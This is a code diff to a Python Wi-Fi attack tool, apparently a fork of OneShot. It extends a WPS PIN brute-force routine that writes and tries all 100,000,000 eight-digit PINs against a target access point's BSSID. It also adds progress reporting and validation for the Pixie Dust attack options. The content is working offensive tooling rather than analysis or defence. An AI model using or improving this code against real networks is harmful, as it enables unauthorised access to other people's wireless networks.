@@ -567,8 +567,12 @@ class BruteforceStatus:
         average_pin_time = statistics.mean(self.attempts_times)
         if len(self.mask) == 4:
             percentage = int(self.mask) / 11000 * 100
-        else:
+        elif len(self.mask) == 7:
             percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
+        elif len(self.mask) == 8:
+            percentage = int(self.mask) / 100000000 * 100
+        else:
+            percentage = 0
         print('[*] {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
             percentage, self.start_time, average_pin_time))
 
@@ -1431,11 +1435,12 @@ def try_bruteforce_file(comp, bssid, path, delay=None):
 
 
 def bruteforce_all_pins(comp, bssid, ssid=None, delay=None):
-    filename = f"{bssid.replace(':', '').upper()}_{(ssid or 'UNKNOWN').replace(' ', '_')}.pins"
+    filename = os.path.join(comp.sessions_dir, f"{bssid.replace(':', '').upper()}_{(ssid or 'UNKNOWN').replace(' ', '_')}.pins")
     if not os.path.exists(filename):
         with open(filename, 'w') as f:
             for i in range(100000000):
                 f.write(f"{i:08d}\n")
+    status = BruteforceStatus()
     while True:
         with open(filename, 'r') as f:
             pin = f.readline().strip()
@@ -1451,6 +1456,7 @@ def bruteforce_all_pins(comp, bssid, ssid=None, delay=None):
                 f.truncate()
             continue
         print(f"[*] WPS Pin: {pin} (bruteforce)")
+        status.registerAttempt(pin)
         TRIED_PINS.add(pin)
         success = comp.single_connection(bssid, pin)
         with open(filename, 'r+') as f:
@@ -1468,7 +1474,10 @@ def build_parser():
     parser = argparse.ArgumentParser(description='OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg', epilog='Example: %(prog)s --interface wlan0 --bssid 00:90:4C:C1:AC:21 --pixie-dust')
     parser.add_argument('--interface', type=str, required=True, help='Name of the interface to use')
     parser.add_argument('--bssid', type=str, help='BSSID of the target AP')
-    parser.add_argument('--pin', type=str, help='Use the specified pin (arbitrary string or 4/8 digit pin)')
+    parser.add_argument(
+        '--pin',
+        type=str,
+        help='Use the specified pin (arbitrary string or 4/8 digit pin; requires --bssid and --pixie-dust)')
     parser.add_argument('--pixie-dust', action='store_true', help='Run Pixie Dust attack')
     parser.add_argument('--pixie-force', action='store_true', help='Run Pixiewps with --force option (bruteforce full range)')
     parser.add_argument('--bruteforce-pins', nargs='?', const=True, help='Bruteforce all pins with progress saved per network when no file is given, otherwise try PINs from the specified file')
@@ -1488,6 +1497,9 @@ def usage():
 if __name__ == '__main__':
     parser = build_parser()
     args = parser.parse_args()
+
+    if args.pin and (not args.bssid or not args.pixie_dust):
+        parser.error('--pin can only be used together with --bssid and --pixie-dust')
 
     if sys.hexversion < 0x03060F0:
         die("The program requires Python 3.6 and above")
